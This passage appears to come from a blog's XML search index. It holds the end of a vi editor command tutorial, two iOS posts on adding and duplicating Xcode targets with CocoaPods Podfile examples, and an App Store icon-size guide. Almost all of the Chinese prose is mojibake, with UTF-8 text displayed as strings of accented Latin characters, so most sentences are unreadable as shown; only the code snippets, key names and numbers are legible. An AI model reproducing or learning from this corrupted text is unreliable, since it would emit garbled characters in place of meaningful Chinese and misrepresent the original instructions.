‡ç§»åˆ°è¯¥è¡Œçš„ç¬¬#ä¸ªä½ç½®ï¼Œå¦‚ï¼š5l,56l 4ï¼‰. åˆ é™¤æ–‡å­— ã€Œxã€ï¼šæ¯æŒ‰ä¸€æ¬¡ï¼Œåˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„â€œåŽé¢â€ä¸€ä¸ªå­—ç¬¦ ã€Œ#xã€ï¼šä¾‹å¦‚ï¼Œã€Œ6xã€è¡¨ç¤ºåˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„â€œåŽé¢â€6ä¸ªå­—ç¬¦ ã€ŒXã€ï¼šå¤§å†™çš„Xï¼Œæ¯æŒ‰ä¸€æ¬¡ï¼Œåˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„â€œå‰é¢â€ä¸€ä¸ªå­—ç¬¦ ã€Œ#Xã€ï¼šä¾‹å¦‚ï¼Œã€Œ20Xã€è¡¨ç¤ºåˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„â€œå‰é¢â€20ä¸ªå­—ç¬¦ ã€Œddã€ï¼šåˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œ ã€Œ#ddã€ï¼šä»Žå…‰æ ‡æ‰€åœ¨è¡Œå¼€å§‹åˆ é™¤#è¡Œ 5ï¼‰. å¤åˆ¶ ã€Œywã€ï¼šå°†å…‰æ ‡æ‰€åœ¨ä¹‹å¤„åˆ°å­—å°¾çš„å­—ç¬¦å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ ã€Œ#ywã€ï¼šå¤åˆ¶#ä¸ªå­—åˆ°ç¼“å†²åŒº ã€Œyyã€ï¼šå¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œåˆ°ç¼“å†²åŒº ã€Œ#yyã€ï¼šä¾‹å¦‚ï¼Œã€Œ6yyã€è¡¨ç¤ºæ‹·è´ä»Žå…‰æ ‡æ‰€åœ¨çš„è¯¥è¡Œâ€œå¾€ä¸‹æ•°â€6è¡Œæ–‡å­— ã€Œpã€ï¼šå°†ç¼“å†²åŒºå†…çš„å­—ç¬¦è´´åˆ°å…‰æ ‡æ‰€åœ¨ä½ç½®ã€‚æ³¨æ„ï¼šæ‰€æœ‰ä¸Žâ€œyâ€æœ‰å…³çš„å¤åˆ¶å‘½ä»¤éƒ½å¿…é¡»ä¸Žâ€œpâ€é…åˆæ‰èƒ½å®Œæˆå¤åˆ¶ä¸Žç²˜è´´åŠŸèƒ½ 6ï¼‰. æ›¿æ¢ ã€Œrã€ï¼šæ›¿æ¢å…‰æ ‡æ‰€åœ¨å¤„çš„å­—ç¬¦ ã€ŒRã€ï¼šæ›¿æ¢å…‰æ ‡æ‰€åˆ°ä¹‹å¤„çš„å­—ç¬¦ï¼Œç›´åˆ°æŒ‰ä¸‹ã€ŒESCã€é”®ä¸ºæ­¢ 7ï¼‰. å›žå¤ä¸Šä¸€æ¬¡æ“ä½œ ã€Œuã€ï¼šå¦‚æžœæ‚¨è¯¯æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¯ä»¥é©¬ä¸ŠæŒ‰ä¸‹ã€Œuã€ï¼Œå›žåˆ°ä¸Šä¸€ä¸ªæ“ä½œ ã€æŒ‰å¤šæ¬¡â€œuâ€å¯ä»¥æ‰§è¡Œå¤šæ¬¡å›žå¤ 8ï¼‰. æ›´æ”¹ ã€Œcwã€ï¼šæ›´æ”¹å…‰æ ‡æ‰€åœ¨å¤„çš„å­—åˆ°å­—å°¾å¤„ ã€Œc#wã€ï¼šä¾‹å¦‚ï¼Œã€Œc3wã€è¡¨ç¤ºæ›´æ”¹3ä¸ªå­— 9ï¼‰. è·³è‡³æŒ‡å®šçš„è¡Œ ã€Œctrlã€+ã€Œgã€åˆ—å‡ºå…‰æ ‡æ‰€åœ¨è¡Œçš„è¡Œå· ã€Œ#Gã€ï¼šä¾‹å¦‚ï¼Œã€Œ15Gã€ï¼Œè¡¨ç¤ºç§»åŠ¨å…‰æ ‡è‡³æ–‡ç« çš„ç¬¬15è¡Œè¡Œé¦– 4ã€Last line modeä¸‹å‘½ä»¤ç®€ä»‹ åœ¨ä½¿ç”¨ã€Œlast line modeã€ä¹‹å‰ï¼Œè¯·è®°ä½å…ˆæŒ‰ã€ŒESCã€é”®ç¡®å®šæ‚¨å·²ç»å¤„äºŽã€Œcommand modeã€ä¸‹åŽï¼Œå†æŒ‰ã€Œï¼šã€å†’å·å³å¯è¿›å…¥ã€Œlast line modeã€ A) åˆ—å‡ºè¡Œå· ã€Œset nuã€ï¼šè¾“å…¥ã€Œset nuã€åŽï¼Œä¼šåœ¨æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå‰é¢åˆ—å‡ºè¡Œå· B) è·³åˆ°æ–‡ä»¶ä¸­çš„æŸä¸€è¡Œ ã€Œ#ã€ï¼šã€Œ#ã€å·è¡¨ç¤ºä¸€ä¸ªæ•°å­—ï¼Œåœ¨å†’å·åŽè¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œå†æŒ‰å›žè½¦é”®å°±ä¼šè·³åˆ°è¯¥è¡Œäº†ï¼Œå¦‚è¾“å…¥æ•°å­—15ï¼Œå†å›žè½¦ï¼Œå°±ä¼šè·³åˆ°æ–‡ç« çš„ç¬¬15è¡Œ C) æŸ¥æ‰¾å­—ç¬¦ ã€Œ/å…³é”®å­—ã€ï¼šå…ˆæŒ‰ã€Œ/ã€é”®ï¼Œå†è¾“å…¥æ‚¨æƒ³å¯»æ‰¾çš„å­—ç¬¦ï¼Œå¦‚æžœç¬¬ä¸€æ¬¡æ‰¾çš„å…³é”®å­—ä¸æ˜¯æ‚¨æƒ³è¦çš„ï¼Œå¯ä»¥ä¸€ç›´æŒ‰ã€Œnã€ä¼šå¾€åŽå¯»æ‰¾åˆ°æ‚¨è¦çš„å…³é”®å­—ä¸ºæ­¢ ã€Œ?å…³é”®å­—ã€ï¼šå…ˆæŒ‰ã€Œ?ã€é”®ï¼Œå†è¾“å…¥æ‚¨æƒ³å¯»æ‰¾çš„å­—ç¬¦ï¼Œå¦‚æžœç¬¬ä¸€æ¬¡æ‰¾çš„å…³é”®å­—ä¸æ˜¯æ‚¨æƒ³è¦çš„ï¼Œå¯ä»¥ä¸€ç›´æŒ‰ã€Œnã€ä¼šå¾€å‰å¯»æ‰¾åˆ°æ‚¨è¦çš„å…³é”®å­—ä¸ºæ­¢ D) ä¿å­˜æ–‡ä»¶ ã€Œwã€ï¼šåœ¨å†’å·è¾“å…¥å­—æ¯ã€Œwã€å°±å¯ä»¥å°†æ–‡ä»¶ä¿å­˜èµ·æ¥ E) ç¦»å¼€vi ã€Œqã€ï¼šæŒ‰ã€Œqã€å°±æ˜¯é€€å‡ºï¼Œå¦‚æžœæ— æ³•ç¦»å¼€viï¼Œå¯ä»¥åœ¨ã€Œqã€åŽè·Ÿä¸€ä¸ªã€Œ!ã€å¼ºåˆ¶ç¦»å¼€vi ã€Œqwã€ï¼šä¸€èˆ¬å»ºè®®ç¦»å¼€æ—¶ï¼Œæ­é…ã€Œwã€ä¸€èµ·ä½¿ç”¨ï¼Œè¿™æ ·åœ¨é€€å‡ºçš„æ—¶å€™è¿˜å¯ä»¥ä¿å­˜æ–‡ä»¶ 5ã€viå‘½ä»¤åˆ—è¡¨ 1ã€ä¸‹è¡¨åˆ—å‡ºå‘½ä»¤æ¨¡å¼ä¸‹çš„ä¸€äº›é”®çš„åŠŸèƒ½ï¼š 123456789101112131415161718192021222324252627282930h å·¦ç§»å…‰æ ‡ä¸€ä¸ªå­—ç¬¦h å·¦ç§»å…‰æ ‡ä¸€ä¸ªå­—ç¬¦k å…‰æ ‡ä¸Šç§»ä¸€è¡Œj å…‰æ ‡ä¸‹ç§»ä¸€è¡Œ^ å…‰æ ‡ç§»åŠ¨è‡³è¡Œé¦–0 æ•°å­—â€œ0â€ï¼Œå…‰æ ‡ç§»è‡³æ–‡ç« çš„å¼€å¤´G å…‰æ ‡ç§»è‡³æ–‡ç« çš„æœ€åŽ$ å…‰æ ‡ç§»åŠ¨è‡³è¡Œå°¾Ctrl+f å‘å‰ç¿»å±Ctrl+b å‘åŽç¿»å±Ctrl+d å‘å‰ç¿»åŠå±Ctrl+u å‘åŽç¿»åŠå±i åœ¨å…‰æ ‡ä½ç½®å‰æ’å…¥å­—ç¬¦a åœ¨å…‰æ ‡æ‰€åœ¨ä½ç½®çš„åŽä¸€ä¸ªå­—ç¬¦å¼€å§‹å¢žåŠ o æ’å…¥æ–°çš„ä¸€è¡Œï¼Œä»Žè¡Œé¦–å¼€å§‹è¾“å…¥ESC ä»Žè¾“å…¥çŠ¶æ€é€€è‡³å‘½ä»¤çŠ¶æ€x åˆ é™¤å…‰æ ‡åŽé¢çš„å­—ç¬¦#x åˆ é™¤å…‰æ ‡åŽçš„ï¼ƒä¸ªå­—ç¬¦X (å¤§å†™X) åˆ é™¤å…‰æ ‡å‰é¢çš„å­—ç¬¦#X åˆ é™¤å…‰æ ‡å‰é¢çš„#ä¸ªå­—ç¬¦dd åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„è¡Œ#dd åˆ é™¤ä»Žå…‰æ ‡æ‰€åœ¨è¡Œæ•°çš„#è¡Œyw å¤åˆ¶å…‰æ ‡æ‰€åœ¨ä½ç½®çš„ä¸€ä¸ªå­—# ywå¤åˆ¶å…‰æ ‡æ‰€åœ¨ä½ç½®çš„#ä¸ªå­—yy å¤åˆ¶å…‰æ ‡æ‰€åœ¨ä½ç½®çš„ä¸€è¡Œ#yy å¤åˆ¶ä»Žå…‰æ ‡æ‰€åœ¨è¡Œæ•°çš„#è¡Œp ç²˜è´´u å–æ¶ˆæ“ä½œcw æ›´æ”¹å…‰æ ‡æ‰€åœ¨ä½ç½®çš„ä¸€ä¸ªå­—#cw æ›´æ”¹å…‰æ ‡æ‰€åœ¨ä½ç½®çš„#ä¸ªå­— 2ã€ä¸‹è¡¨åˆ—å‡ºè¡Œå‘½ä»¤æ¨¡å¼ä¸‹çš„ä¸€äº›æŒ‡ä»¤ 123456w filename å‚¨å­˜æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶ä¸ºfilenamewq filename å‚¨å­˜æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶ä¸ºfilenameï¼Œå¹¶é€€å‡ºviq! æ”¾å¼ƒæ‰€æœ‰ä¿®æ”¹ï¼Œé€€å‡ºviset nu æ˜¾ç¤ºè¡Œå·/æˆ–? æŸ¥æ‰¾ï¼Œåœ¨/åŽè¾“å…¥è¦æŸ¥æ‰¾çš„å†…å®¹n ä¸Ž/æˆ–?ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚æžœæŸ¥æ‰¾çš„å†…å®¹ä¸æ˜¯æƒ³è¦æ‰¾çš„å…³é”®å­—ï¼ŒæŒ‰næˆ–å‘åŽï¼ˆä¸Ž/è”ç”¨ï¼‰æˆ–å‘å‰ï¼ˆä¸Ž?è”ç”¨ï¼‰ç»§ç»­æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ å¯¹äºŽç¬¬ä¸€æ¬¡ç”¨viï¼Œæœ‰å‡ ç‚¹æ³¨æ„è¦æé†’ä¸€ä¸‹ï¼š 1ã€ç”¨viæ‰“å¼€æ–‡ä»¶åŽï¼Œæ˜¯å¤„äºŽã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€ï¼Œæ‚¨è¦åˆ‡æ¢åˆ°ã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€æ‰èƒ½å¤Ÿè¾“å…¥æ–‡å­—ã€‚ åˆ‡æ¢æ”¾æ–¹æ³•ï¼šåœ¨ã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€ä¸‹æŒ‰ä¸€ä¸‹å­—æ¯ã€Œiã€å°±å¯ä»¥è¿›å…¥ã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€ï¼Œè¿™æ—¶å€™ä½ å°±å¯ä»¥å¼€å§‹è¾“å…¥æ–‡å­—äº† 2ã€ç¼–è¾‘å¥½åŽï¼Œéœ€ä»Žæ’å…¥æ¨¡å¼åˆ‡æ¢ä¸ºå‘½ä»¤è¡Œæ¨¡å¼æ‰èƒ½å¯¹æ–‡ä»¶è¿›è¡Œä¿å­˜ï¼Œåˆ‡æ¢æ–¹æ³•ï¼šæŒ‰ã€ŒESCã€é”® 3ã€ä¿å­˜å¹¶é€€å‡ºæ–‡ä»¶ï¼šåœ¨å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥:wqå³å¯ï¼ï¼ˆåˆ«å¿˜äº†wqå‰é¢çš„:ï¼‰]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å¤šTargetï¼ˆäºŒï¼‰ï¼šå¤åˆ¶Target]]></title>
    <url>%2Farchives%2F9c6697bb.html</url>
    <content type="text"><![CDATA[ç¥ä½ ä»Šå¤©æ„‰å¿«ï¼Œä½ æ˜Žå¤©çš„æ„‰å¿«ç•™ç€æˆ‘æ˜Žå¤©å†ç¥ã€‚ â€”â€”çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ é¡¹ç›®ä¸­å¤åˆ¶æ·»åŠ Targetæ³¨æ„ç‚¹ ä»¥MultiTargetä¸ºä¾‹å­ï¼Œå¤åˆ¶æ·»åŠ ä¸€ä¸ªTarget å¦‚æžœä½¿ç”¨Cocoapodsç®¡ç†é¡¹ç›®ä¾èµ–ï¼Œä¸€å®šè¦å…ˆæŠŠpodsåˆå§‹åŒ–åŽå†å¤åˆ¶Target å¤åˆ¶TargetåŽéœ€è¦é‡æ–°è®¾ç½®Podfileæ–‡ä»¶çš„ï¼ˆå¤šä¸ªTargetä¾èµ–åº“ï¼‰ æ·»åŠ æ–‡ä»¶å’Œç´ æçš„æ—¶å€™æ³¨æ„å¯¹åº”çš„Targeté€‰æ‹© æ‰“å¼€éœ€è¦æ·»åŠ Targetçš„é¡¹ç›®ï¼Œé€‰æ‹©å¯¹åº”çš„Targetå¤åˆ¶ å¤åˆ¶å®ŒæˆåŽä¿®æ”¹å¤åˆ¶å®Œç”Ÿæˆçš„æ–‡ä»¶ é€‰æ‹©ä¸­é—´çš„ä»…å¤åˆ¶ï¼Œå¤åˆ¶å®ŒæˆåŽä¿®æ”¹å¤åˆ¶çš„æ–‡ä»¶ MultiTarget Copy â€“&gt; MultiTarget_Second MultiTarget-info.plist â€“&gt; info_second.plist ä¿®æ”¹å®Œä¹‹åŽéœ€è¦é€‰ä¸­å½“å‰çš„TargetåŽGeneralé‡Œé¢é€‰æ‹©å¯¹åº”çš„ä¿®æ”¹åŽçš„æ–‡ä»¶info_second.plist ä¿®æ”¹Schemes çš„Targetåç§° MultiTarget Copy â€“&gt; MultiTarget_Second é…ç½®ä¸åŒçš„Appå›¾æ ‡å’Œå¯åŠ¨å›¾ å¦‚æžœéœ€è¦å…±ç”¨ä¸€å¥—å›¾æ ‡ï¼Œæ³¨æ„å‹¾é€‰Target Membership å¦‚æžœéœ€è¦è®¾ç½®ä¸åŒçš„å›¾ç‰‡ç´ æå¯¹åº”ä¸åŒçš„Target,æ³¨æ„é€‰æ‹©ä¸åŒç‰ˆæœ¬çš„Target Membership å¯ä»¥é…ç½®ï¼š Bundle identifier Display Name Version Bulid è¯ä¹¦ Appå›¾æ ‡å’Œå¯åŠ¨å›¾æ ‡ é…ç½®ä¸åŒçš„æ ‡è®° é…ç½®å¤åˆ¶åŽTargetæ ‡è¯†ï¼Œå¦‚ TARGET_SECOND=1 æ³¨æ„Debugå’ŒReleaseæ¨¡å¼éƒ½éœ€è¦é…ç½® é‡æ–°é…ç½®Podfileæ–‡ä»¶ï¼Œé‡æ–°å®‰è£…ä¾èµ–åº“ï¼Œå¦‚123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end é¡¹ç›®ä¸­å®žæˆ˜ åœ¨æ–‡ä»¶ä¸­æ ¹æ®è®¾ç½®çš„Targetæ ‡è®°ï¼ŒåŒºåˆ†ä¸åŒçš„Target ç›´æŽ¥åˆ‡æ¢ä¸åŒçš„Targetï¼Œå³å¯ç¼–è¯‘ç”Ÿæˆå¯¹åº”çš„app æµ‹è¯•ä»£ç é€»è¾‘åŒæ–°å»ºTargetä¸€æ ·ï¼Œç›´æŽ¥é‡‡ç”¨ä¹‹å‰çš„æˆªå›¾]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å¤šTargetï¼ˆä¸€ï¼‰ï¼šæ–°å»ºTarget]]></title>
    <url>%2Farchives%2Fe016e61f.html</url>
    <content type="text"><![CDATA[åœ¨æˆ‘å‘¨å›´ï¼Œåƒæˆ‘è¿™ç§æ€§æ ¼çš„äººç‰¹å¤šâ€”â€”åœ¨å…¬ä¼—åœºåˆä»€ä¹ˆéƒ½ä¸è¯´ï¼Œåˆ°äº†ç§ä¸‹é‡Œå´å¦™è¯­è¿žç ï¼Œæ¢è¨€ä¹‹ï¼Œå¯¹ä¿¡å¾—è¿‡çš„äººä»€ä¹ˆéƒ½è¯´ï¼Œå¯¹ä¿¡ä¸è¿‡çš„äººä»€ä¹ˆéƒ½ä¸è¯´ã€‚ â€”â€”çŽ‹å°æ³¢ã€Šæ²‰é»˜çš„å¤§å¤šæ•°ã€‹ éœ€æ±‚1: éœ€æ±‚ä¸åŒ, Appåˆ†å…è´¹ç‰ˆå’Œä¸“ä¸šç‰ˆ æˆ–è€…åˆ†å›½å†…ç‰ˆå’Œå›½é™…ç‰ˆæˆ–è€…åˆ†ä¼ä¸šç‰ˆå’ŒApp Storeç‰ˆé™¤äº†ä¸ªåˆ«é¡µé¢ä¸åŒ, å…¶ä»–æž„å»ºé¡µé¢éƒ½å®Œå…¨ä¸€æ · æ€è€ƒ: ç¬¬ä¸€ç§:æ–°å»ºä¸¤ä¸ªé¡¹ç›®å·¥ç¨‹å¼€å‘,æŠŠç›¸åŒçš„é¡µé¢å°è£…å¹¶æ‹·è´åˆ°é¡¹ç›®ä½¿ç”¨ ç¬¬äºŒç§:åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­,å»ºç«‹ä¸¤ä¸ªä¸åŒçš„targetè¿›è¡Œå¼€å‘ ä¼˜åŠ£: ç¬¬ä¸€ç§æ–¹å¼:é¡¹ç›®ä¹‹é—´ç‹¬ç«‹åˆ†å¼€,è€¦åˆå’Œå¹²æ‰°åº¦å°,ä½†æ˜¯é¡¹ç›®å¼€å‘æ¶ˆè€—æœ‰ç‚¹å¤§ ç¬¬äºŒç§æ–¹å¼:èŠ‚çœé¡¹ç›®èµ„æºæ‹·è´,ä½†æ˜¯åœ¨é…ç½®æ–‡ä»¶å’Œæäº¤åˆ°gitæˆ–è€…SVNä»“åº“å®¹æ˜“å†²çª è§£å†³æ–¹æ¡ˆ ä½¿ç”¨å¤šTargetæ–¹å¼ï¼Œåœ¨åŽŸæœ‰çš„åŸºç¡€ä¸Šé¢Newä¸€ä¸ªTarget éœ€æ±‚2: Appéœ€è¦åº”å¯¹ä¸åŒçš„æµ‹è¯•éœ€æ±‚ï¼šå¼€å‘çŽ¯å¢ƒã€æµ‹è¯•çŽ¯å¢ƒã€é¢„å‘å¸ƒçŽ¯å¢ƒã€å‘å¸ƒçŽ¯å¢ƒ éœ€è¦ä¸åŒçŽ¯å¢ƒçš„Appå¯ä»¥åŒæ—¶è¿è¡Œï¼Œä»¥å¯¹æ¯”ä¸åŒç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚ éœ€è¦ä¸åŒçŽ¯å¢ƒçš„Appè¿è¡ŒåŽæœ‰ä¸åŒçš„ï¼šAppåç§°ã€å›¾æ ‡ã€å¯åŠ¨å›¾ç­‰ç­‰ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨å¤šTargetæ–¹å¼ï¼Œåœ¨åŽŸæœ‰çš„åŸºç¡€ä¸Šé¢Duplicateä¸€ä¸ªTarget Cocoapodséœ€è¦é‡æ–°å¤„ç† å¦‚æžœé¡¹ç›®ä½¿ç”¨äº†Cocoapodsï¼Œé‚£ä¹ˆå¢žåŠ TargetåŽï¼Œä¸ç®¡æ˜¯æ–°å»ºTargetæˆ–è€…å¤åˆ¶Targetéƒ½éœ€è¦å¤„ç†Podfileæ–‡ä»¶ æ–¹å¼1123456789101112platform :ios, &quot;8.0&quot;target &quot;MultiTarget&quot; doworkspace &apos;MultiTarget&apos;link_with &apos;MultiTarget&apos;, &apos;MultiTarget_Second&apos;pod &apos;ReactiveCocoa&apos;, &apos;~&gt; 2.5&apos;pod &apos;SVProgressHUD&apos;pod &apos;Masonry&apos;end æ–¹å¼2 ï¼ˆæŽ¨èï¼‰1234567891011source &apos;https://github.com/CocoaPods/Specs.git&apos;platform :ios, &apos;8.0&apos;target &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;GoogleMaps&apos;endtarget &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;BaiduMapKit&apos;end é¡¹ç›®ä¸­æ–°å»ºTargetæ³¨æ„ç‚¹ ä»¥MultiTargeté¡¹ç›®ä¸ºä¾‹å­ï¼Œæ·»åŠ ä¸€ä¸ªTarget å¦‚æžœä½¿ç”¨Cocoapodsç®¡ç†é¡¹ç›®ä¾èµ–ï¼Œå°½é‡å…ˆæŠŠpodsåˆå§‹åŒ–åŽå†å¤åˆ¶Target å¤åˆ¶TargetåŽéœ€è¦é‡æ–°è®¾ç½®Podfileæ–‡ä»¶çš„ æ·»åŠ æ–‡ä»¶å’Œç´ æçš„æ—¶å€™æ³¨æ„å¯¹åº”çš„Targeté€‰æ‹© éœ€è¦æ‰‹åŠ¨æŠŠå¦ä¸€ä¸ªTargeté‡Œé¢çš„éœ€è¦çš„æ‰€æœ‰çš„.mæ–‡ä»¶å’Œnibæ–‡ä»¶éƒ½åœ¨Target Membership é‡Œé¢å‹¾é€‰ å¦‚æžœæœ‰å¤šè¯­è¨€æ–‡ä»¶ä¹Ÿéœ€è¦åœ¨Target Membership é‡Œé¢å‹¾é€‰ å¦‚æžœé…ç½®æœ‰pchæ–‡ä»¶ã€éœ€è¦å†æ–°å»ºçš„Targeté‡Œé¢é‡æ–°é…ç½®pchæ–‡ä»¶è·¯å¾„ éœ€è¦å•ç‹¬é…ç½®ä¸€äº›info.plisté€‰é¡¹ï¼Œå¦‚ç½‘ç»œATS/æƒé™å£°æ˜Žç­‰ éœ€è¦é‡æ–°è®¾ç½®ä¸€éä¾èµ–Targetå·²ç»è®¾ç½®è¿‡çš„ä¸€äº›æŽ§åˆ¶é¢æ¿çš„å±žæ€§ï¼Œå¦‚åŽå°ï¼Œå®šä½ï¼Œbitcodeç­‰ é¡¹ç›®æ–°å»ºä¸€ä¸ªTarget ç»§æ‰¿é…ç½® åˆ é™¤ä¸éœ€è¦çš„é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶å’Œxib ä¿®æ”¹AppDelegateåç§°ï¼Œä¿®æ”¹å…¶ç»§æ‰¿è‡ªä¸Šä¸€ä¸ªTargetçš„AppDelegate ä¿®æ”¹ç¨‹åºå¯åŠ¨è°ƒç”¨çˆ¶ç±»çš„é…ç½®ä¿¡æ¯ ä¿®æ”¹çˆ¶ç±»AppDelegateæ–‡ä»¶æƒé™ å¯ä»¥ä¾›ä¸¤ä¸ªTargetè®¿é—® é…ç½®ä¸åŒçš„æ ‡è®° åœ¨éœ€è¦é…ç½®çš„Targetä¸­æ·»åŠ æ ‡è®°, å¦‚æ–°å¢žåŠ çš„Target æ·»åŠ TARGET_SECOND=1 æ³¨æ„Debugå’ŒReleaseæ¨¡å¼éƒ½éœ€è¦é…ç½® é…ç½®å¯¹åº”çš„å¯åŠ¨å›¾å’ŒAppå›¾æ ‡ç´ æ å¯ä»¥åœ¨ä¸åŒçš„Targeç§é…ç½®ä¸åŒçš„Appå›¾æ ‡ã€å¯åŠ¨å›¾ã€ä»¥åŠå…¶ä»–å›¾æ ‡ å¦‚æžœä¸¤ä¸ªTargetå…±ç”¨ä¸€å¥—å›¾æ ‡ç´ æï¼Œåˆ™åœ¨éœ€è¦å…±ç”¨çš„Assets.xcassetsä¸­çš„Target Membershipä¸­å‹¾é€‰éœ€è¦å…±äº«çš„Target. é‡æ–°é…ç½®Podfileæ–‡ä»¶ï¼Œé‡æ–°å®‰è£…ä¾èµ–åº“ï¼Œå¦‚123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end é¡¹ç›®ä¸­å®žæˆ˜ åˆ é™¤é¡¹ç›®æ¯ä¸ªTargetä¸­çš„Main interface ä¸­çš„Mainï¼Œä¸éœ€è¦ä»ŽXIBä¸­åŠ è½½ï¼Œå› ä¸ºç¬¬äºŒä¸ªTargetæ˜¯å’Œç¬¬ä¸€ä¸ªTargetåˆå§‹åŒ–å…¥å£ç›¸åŒï¼Œåœ¨Appdelegateä¸­ã€‚ éœ€è¦ä¸¤ä¸ªé¡¹ç›®å…±äº«çš„.m xibæ–‡ä»¶éƒ½éœ€è¦Target Membershipä¸­å‹¾é€‰éœ€è¦å…±äº«çš„Target. åœ¨æ–‡ä»¶ä¸­æ ¹æ®è®¾ç½®çš„Targetæ ‡è®°ï¼ŒåŒºåˆ†ä¸åŒçš„Target ç›´æŽ¥åˆ‡æ¢ä¸åŒçš„Targetï¼Œå³å¯ç¼–è¯‘ç”Ÿæˆå¯¹åº”çš„app]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹AppStoreç¯‡]]></title>
    <url>%2Farchives%2F9b9b2c59.html</url>
    <content type="text"><![CDATA[App Store ä¸Šæž¶å›¾æ ‡è§„èŒƒåŠç›¸å…³é—®é¢˜ã€‚ iOSå¼€å‘ä¹‹AppStoreç¯‡â€“ ä¸Šæž¶å›¾ç‰‡å°ºå¯¸ éœ€è¦ä¸€å¼ é€šç”¨çš„1024 x 1024 åœ¨App Storeé‡Œé¢ç”¨ ï¼ˆxcode9 ä¹‹å‰åœ¨App Storeé‡Œé¢ä¸Šä¼ ï¼›xcode9ä¹‹åŽåœ¨å¼€å‘å·¥å…·é‡Œé¢é…ç½®ï¼‰ å…¶æ ¼å¼å¿…é¡»ä¸º JPG æˆ– PNGï¼Œæœ€ä½Žåˆ†è¾¨çŽ‡è‡³å°‘ä¸º 72 DPIï¼Œå¹¶é‡‡ç”¨ RGB è‰²å½©ç©ºé—´ ä¸èƒ½åŒ…å«å›¾å±‚æˆ–åœ†è§’ ä¸èƒ½æœ‰é€æ˜Žåƒç´ å’Œalphaé€šé“ æ¡Œé¢å›¾æ ‡ (app icon) for iPhone6 plus(@3x) : 180 x 180 // å‘½åè§„èŒƒï¼šApp-60@3x for iPhone 6/5s/5/4s/4(@2x) : 120 x 120 // å‘½åè§„èŒƒï¼šApp-60@2x ç³»ç»Ÿæœç´¢æ¡†å›¾æ ‡ (Spotlight search results icon) for iPhone6 plus(@3x) : 120 x 120 // å‘½åè§„èŒƒï¼šSpotlight-40@3x for iPhone6/5s/5/4s/4(@2x) : 80 x 80 // å‘½åè§„èŒƒï¼šSpotlight-40@2x ç³»ç»Ÿè®¾ç½®å›¾æ ‡ (Settings icon) for iPhone6 plus(@3x) : 87 x 87 // å‘½åè§„èŒƒï¼šSettings-29@3x for iPhone6/5s/5/4s/4(@2x) : 58 x 58 // å‘½åè§„èŒƒï¼šSettings-29@2x å¯åŠ¨å›¾ç‰‡ (launch image) for iPhoen5s/5(@2x) : 640 x 1136 // å‘½åè§„èŒƒï¼šLaunchImage-568h@2x for iPhone 6(@2x) : 750 x 1334 // å‘½åè§„èŒƒï¼š LaunchImage-667h@2x for iPhone 6 plus (@3x) : 1242 x 2208 // å‘½åè§„èŒƒï¼š LaunchImage-736h@3x for iPhoneX (@3x) : 1125 x 2436 // å‘½åè§„èŒƒï¼š LaunchImage-812h@3x é¢„è§ˆå’Œå±å¹•å¿«ç…§å…³äºŽApp Storeä¸Šæž¶ç”µè„‘ç³»ç»Ÿæ˜¯æµ‹è¯•ç‰ˆæˆ–è€…Xcodeæ˜¯æµ‹è¯•ç‰ˆ æ‰“åŒ…ä¸Šä¼ å‡ºé”™æŠ¥å¦‚ä¸‹é”™è¯¯ä»£ç ï¼Œæœ€åŽé€šè¿‡é‡è£…ç³»ç»Ÿï¼ˆæ­£å¼ç‰ˆï¼‰è§£å†³ æ³¨æ„å³ä½¿ç”¨æµ‹è¯•ç‰ˆç³»ç»Ÿæˆ–è€…Xcodeæ‰“åŒ…çš„ç¨‹åºä¸Šä¼ æˆåŠŸã€æœ€åŽä¸Šä¼ åˆ°AppStoreå®¡æ ¸çš„æ—¶å€™ä¹Ÿæœ‰å¯èƒ½è¢«æ‹’ 1ERROR ITMS-90167: &quot;No .app bundles found in the package&quot; é¡¹ç›®ä¸­æœ‰é™æ€åº“ä¸æ”¯æŒbitcodeä¸Šæž¶æ‰“åŒ…é”™è¯¯1â€˜xxx/lib**SDK.a(**ForSDK.o)â€™does not contain bitcode. You must rebuild it with bitcode 